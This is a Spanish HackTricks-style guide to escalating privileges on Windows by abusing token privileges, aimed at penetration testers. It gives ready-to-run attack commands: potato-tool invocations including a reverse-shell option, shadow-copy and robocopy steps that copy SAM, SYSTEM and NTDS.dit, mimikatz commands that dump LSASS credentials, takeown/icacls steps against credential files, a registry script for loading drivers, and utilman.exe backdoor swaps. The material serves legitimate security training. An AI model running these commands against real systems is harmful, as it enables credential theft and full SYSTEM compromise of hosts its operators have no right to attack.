# Abusar de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si **no sabes qué son los Windows Access Tokens**, lee esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Es posible que puedas escalar privilegios abusando de tokens que ya tienes.**

### SeImpersonatePrivilege

Este privilegio permite que un proceso suplante (pero no cree) un token cuando puede obtener un identificador para ese token. Se puede adquirir un token privilegiado de un servicio de Windows (DCOM) induciéndolo a realizar una autenticación NTLM contra un exploit, lo que permite ejecutar un proceso con privilegios de SYSTEM.<sup>[[2]](#references)</sup> Esta primitiva se puede explotar con herramientas como [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requiere que WinRM esté deshabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) y [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Una aplicación web accesible solo mediante loopback puede ser una vía de coerción independiente si un usuario local puede acceder a un endpoint autenticado que realiza una solicitud a una URL elegida por quien la invoca, bajo una identidad más privilegiada. Revisa la autorización del endpoint y sus restricciones de URL, la identidad real del cliente saliente y su comportamiento de autenticación, y si ese cliente puede conectarse a un listener controlado por el usuario con menos privilegios. Que `SeImpersonatePrivilege` esté habilitado, haya un listener de IIS o exista un parámetro para obtener una URL no demuestra por sí solo que se pueda obtener un token privilegiado o escalar privilegios. Mantén esta revisión pasiva; no envíes solicitudes de coerción durante la enumeración. Consulta la documentación de Microsoft sobre [suplantación del cliente](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) e [identidades de grupos de aplicaciones de IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Notas modernas para operadores:

- **JuicyPotato es una herramienta antigua**: en Windows 10 1809+/Server 2019+, prefiere **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, según qué superficie RPC/COM siga siendo accesible.
- Si comprometiste un servicio que se ejecuta como **`LOCAL SERVICE`** o **`NETWORK SERVICE`** y `whoami /priv` muestra un **token filtrado** sin `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera primero el **conjunto de privilegios predeterminado** de la cuenta (por ejemplo, con **FullPowers**) y después vuelve a probar la familia potato.<sup>[[3]](#references)</sup>
- Algunos forks más recientes son más prácticos para los operadores que las herramientas originales. Por ejemplo, **SigmaPotato** añade ejecución en memoria/por reflexión y compatibilidad con versiones modernas de Windows, mientras que **PrintNotifyPotato** abusa del servicio COM PrintNotify y suele ser útil cuando la ruta clásica de Spooler está deshabilitada.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es muy similar a **SeImpersonatePrivilege**: utiliza el **mismo método** para obtener un token con privilegios.\
Luego, este privilegio permite **asignar un token primario** a un proceso nuevo o suspendido. Con el token de impersonación con privilegios, puedes derivar un token primario (DuplicateTokenEx).\
Con el token, puedes crear un **proceso nuevo** con 'CreateProcessAsUser' o crear un proceso suspendido y **asignarle el token** (por lo general, no puedes modificar el token primario de un proceso en ejecución).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Si tienes habilitado este token, puedes usar **KERB_S4U_LOGON** para obtener un **token de impersonación** de cualquier otro usuario sin conocer sus credenciales, **añadir un grupo arbitrario** (admins) al token, establecer el **nivel de integridad** del token en "**medium**" y asignar este token al **hilo actual** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Este privilegio hace que el sistema **conceda acceso de lectura** a cualquier archivo (limitado a operaciones de lectura). Se utiliza para **leer los hashes de contraseña de las cuentas locales de Administrator** del registro; luego, se pueden usar herramientas como "**psexec**" o "**wmiexec**" con el hash (técnica Pass-the-Hash). Sin embargo, esta técnica falla en dos casos: cuando la cuenta Local Administrator está deshabilitada o cuando hay una política que elimina los derechos administrativos de los Local Administrators que se conectan de forma remota.<sup>[[2]](#references)</sup>\
En la práctica, el flujo de trabajo integrado más fiable suele ser **VSS + `robocopy /b`**: crear o exponer una copia sombra y luego copiar `SAM`/`SYSTEM` o `NTDS.dit` en **modo de copia de seguridad**, lo que evita las ACL de los archivos.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Puedes **abusar de este privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- siguiendo a **IppSec** en [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- O como se explica en la sección **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilegio proporciona **acceso de escritura** a cualquier archivo del sistema, independientemente de la Access Control List (ACL) del archivo. Abre numerosas posibilidades de escalada, incluida la capacidad de **modificar servicios**, realizar DLL Hijacking y configurar **debuggers** mediante Image File Execution Options, entre otras técnicas.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege es un permiso potente, especialmente útil cuando un usuario puede suplantar tokens, pero también cuando no tiene SeImpersonatePrivilege. Esta capacidad depende de poder suplantar un token que represente al mismo usuario y cuyo nivel de integridad no supere el del proceso actual.<sup>[[2]](#references)</sup>

**Puntos clave:**

- **Suplantación sin SeImpersonatePrivilege:** Es posible aprovechar SeCreateTokenPrivilege para EoP mediante la suplantación de tokens bajo condiciones específicas.
- **Condiciones para la suplantación de tokens:** Para que la suplantación tenga éxito, el token objetivo debe pertenecer al mismo usuario y tener un nivel de integridad menor o igual al del proceso que intenta suplantarlo.
- **Creación y modificación de tokens de suplantación:** Los usuarios pueden crear un token de suplantación y mejorarlo añadiendo el SID (Security Identifier) de un grupo privilegiado.

### SeLoadDriverPrivilege

Este privilegio permite que un proceso **cargue y descargue controladores de dispositivo** creando una entrada del registro con valores específicos de `ImagePath` y `Type`. Como el acceso directo de escritura a `HKLM` (HKEY_LOCAL_MACHINE) está restringido, se puede usar `HKCU` (HKEY_CURRENT_USER). Sin embargo, se necesita una ruta específica para que el kernel reconozca la entrada de `HKCU` como una configuración de controlador.<sup>[[2]](#references)</sup>

En el uso ofensivo moderno, lo habitual es **BYOVD** (bring your own vulnerable driver): cargar un controlador del kernel **firmado pero vulnerable** y luego usar sus IOCTLs para deshabilitar protecciones o lograr la ejecución de código en el kernel. Ten en cuenta que, en versiones recientes de Windows 11/Server, la **lista de bloqueo de controladores vulnerables de Microsoft** y/o **HVCI/Memory Integrity** suelen impedir que funcionen cadenas públicas antiguas; por eso, los ejemplos clásicos del estilo `szkg64.sys` ya no son fiables en todos los casos.

La ruta es `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, donde `<RID>` es el Relative Identifier del usuario actual. Dentro de `HKCU`, se debe crear toda esta ruta y establecer dos valores:<sup>[[2]](#references)</sup>

- `ImagePath`, que es la ruta al binario que se ejecutará
- `Type`, con el valor `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Pasos a seguir:**

1. Accede a `HKCU` en lugar de `HKLM` debido a las restricciones de acceso de escritura.
2. Crea la ruta `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, donde `<RID>` representa el Relative Identifier del usuario actual.
3. Establece `ImagePath` en la ruta de ejecución del binario.
4. Asigna a `Type` el valor `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Más formas de abusar de este privilegio en [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Es similar a **SeRestorePrivilege**. Su función principal permite que un proceso **asuma la propiedad de un objeto**, eludiendo el requisito de acceso discrecional explícito mediante la concesión de derechos de acceso WRITE_OWNER. El proceso consiste primero en obtener la propiedad de la clave del registro deseada para poder escribir en ella y, después, modificar la DACL para habilitar las operaciones de escritura.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Este privilegio permite **depurar otros procesos**, incluso leer y escribir en su memoria. Con este privilegio se pueden emplear diversas estrategias de memory injection, capaces de evadir la mayoría de las soluciones antivirus y de prevención de intrusiones en el host.<sup>[[2]](#references)</sup>

En las versiones modernas de Windows, recuerda que `SeDebugPrivilege` suele bastar para abrir **procesos SYSTEM no protegidos** y duplicar sus tokens, pero **no** garantiza que puedas acceder a **LSASS**. Si **RunAsPPL / LSA Protection** está habilitado, los procesos no protegidos no pueden leer ni inyectar código en LSASS, aunque `SeDebugPrivilege` esté presente. En ese caso, roba un token de otro proceso SYSTEM que no esté protegido por PPL, o combina la técnica con un bypass de PPL/BYOVD en vez de dar por hecho que `procdump` funcionará. Para ver un ejemplo completo de copia de tokens usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulta [esta página](sedebug-+-seimpersonate-copy-token.md).

#### Volcar memoria

Puedes usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar la memoria de un proceso**. En concreto, esto puede aplicarse al proceso **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsable de almacenar las credenciales de usuario cuando este inicia sesión correctamente en un sistema.

A continuación, puedes cargar este volcado en mimikatz para obtener contraseñas:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Un volcado de LSASS legible guardado anteriormente podría estar disponible aunque la cuenta actual no tenga permiso para capturar el proceso protegido en ejecución. Considera un archivo de volcado o un archivo comprimido con un nombre similar solo como una pista: verifica el acceso y el contenido, y luego determina si las credenciales recuperadas siguen siendo válidas y permiten acceder a un contexto con mayores privilegios. El nombre del archivo por sí solo no demuestra que el archivo comprimido contenga un volcado ni que las credenciales se puedan reutilizar.

#### RCE

Si quieres obtener una shell `NT SYSTEM`, puedes usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Este derecho (Realizar tareas de mantenimiento de volúmenes) puede permitir operaciones privilegiadas en volúmenes, pero no garantiza por sí solo un identificador de volumen sin procesar legible ni acceso arbitrario a archivos. También importan las ACL de los dispositivos, el estado del token, la versión de Windows y la operación solicitada. En su lugar, una operación de control de volumen permitida podría cambiar las ACL del sistema de archivos; se trata de una acción que modifica el sistema y que puede afectar a todo el volumen. En un host de CA, el abuso de certificados también requiere acceso a material de clave privada utilizable, y los archivos protegidos con EFS siguen requiriendo una clave de descifrado o recuperación autorizada. Consulta los requisitos detallados a continuación.<sup>[[5]](#references)</sup>

Consulta las técnicas y mitigaciones detalladas:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Comprobar privilegios

```
whoami /priv
```

Los **tokens que aparecen como Disabled** normalmente se pueden habilitar, así que a menudo puedes abusar tanto de los privilegios _Enabled_ como de los _Disabled_.

### Habilitar todos los tokens

Si tienes privilegios deshabilitados, puedes usar el script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos los tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

O el **script** incorporado en esta [**publicación**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabla

Lista completa de privilegios de token en [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); el resumen siguiente solo incluye formas directas de explotar el privilegio para obtener una sesión de administrador o leer archivos confidenciales.<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | herramienta de terceros | _"Permitiría a un usuario suplantar tokens y escalar privilegios hasta obtener acceso al sistema NT mediante herramientas como potato.exe, rottenpotato.exe y juicypotato.exe"_                                                                                                                                                                     | Gracias a [Aurélien Chalot](https://twitter.com/Defte_) por la actualización. Pronto intentaré reformularlo de forma más práctica, como una receta.                                                                                                                                                                            |
| **`SeBackup`**             | **Amenaza** | _**Comandos integrados**_ | Leer archivos confidenciales con `robocopy /b` o herramientas de copia específicas compatibles con SeBackup.                                                                                                                                                                                                                                       | <p>- Ideal para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` y, a veces, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` es práctico, pero los cmdlets/API específicos de SeBackup suelen ser más flexibles para archivos bloqueados o abiertos.</p>                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | herramienta de terceros | Crear un token arbitrario que incluya derechos de administrador local mediante `NtCreateToken`.                                                                                                                                                                                                                                                      |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicar un token SYSTEM de un proceso **no PPL** o volcar la memoria de un proceso no protegido.                                                                                                                                                                                                                                                     | <p>El volcado de LSASS suele estar bloqueado si está habilitada la protección RunAsPPL/LSA.</p><p>El script está disponible en [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                         |
| **`SeImpersonate`**        | _**Admin**_ | herramienta de terceros | Usar la **familia Potato** / la suplantación mediante named pipes para iniciar un proceso como SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                         | <p>Es más práctico desde cuentas de servicio como IIS APPPOOL, MSSQL, tareas programadas o cualquier contexto que ya tenga `SeImpersonatePrivilege`.</p>                                                                                                                                                                       |
| **`SeLoadDriver`**         | _**Admin**_ | herramienta de terceros | <p>1. Cargar un controlador del kernel firmado pero vulnerable (BYOVD)<br>2. Usar los IOCTL del controlador para obtener acceso de lectura/escritura al kernel, deshabilitar herramientas de seguridad o escalar privilegios a SYSTEM<br><br>Como alternativa, este privilegio puede usarse para descargar controladores relacionados con la seguridad mediante el comando integrado <code>fltMC</code>; por ejemplo, <code>fltMC sysmondrv</code></p> | <p>Los controladores públicos antiguos, como <code>szkg64.sys</code>, son cada vez más bloqueados en las versiones modernas de Windows por la lista de bloqueo de controladores vulnerables / HVCI.</p>                                                                                                                       |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Iniciar PowerShell/ISE con el privilegio SeRestore presente.<br>2. Habilitar el privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Cambiar el nombre de utilman.exe a utilman.old<br>4. Cambiar el nombre de cmd.exe a utilman.exe<br>5. Bloquear la consola y pulsar Win+U</p> | <p>Algunos programas antivirus pueden detectar el ataque.</p><p>Un método alternativo consiste en reemplazar los binarios de servicios almacenados en "Program Files" mediante el mismo privilegio.</p>                                                                                                                                 |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Comandos integrados**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Cambiar el nombre de cmd.exe a utilman.exe<br>4. Bloquear la consola y pulsar Win+U</p>                                                                                                                          | <p>Algunos programas antivirus pueden detectar el ataque.</p><p>Un método alternativo consiste en reemplazar los binarios de servicios almacenados en "Program Files" mediante el mismo privilegio.</p>                                                                                                                                 |
| **`SeTcb`**                | _**Admin**_ | herramienta de terceros | <p>Manipular tokens para incluir derechos de administrador local. Puede requerir SeImpersonate.</p><p>Por verificar.</p>                                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - rutas de explotación desde privilegios de Windows hasta administrador](https://github.com/gtworek/Priv2Admin)
- [2] [Abuso de privilegios de token para LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – ¡Devuélvanme mis privilegios! ¿Por favor?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (el modo de copia de seguridad `/b` omite las comprobaciones de ACL de archivos/carpetas)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Realizar tareas de mantenimiento de volúmenes (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → exfiltración de clave de CA → certificado dorado)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
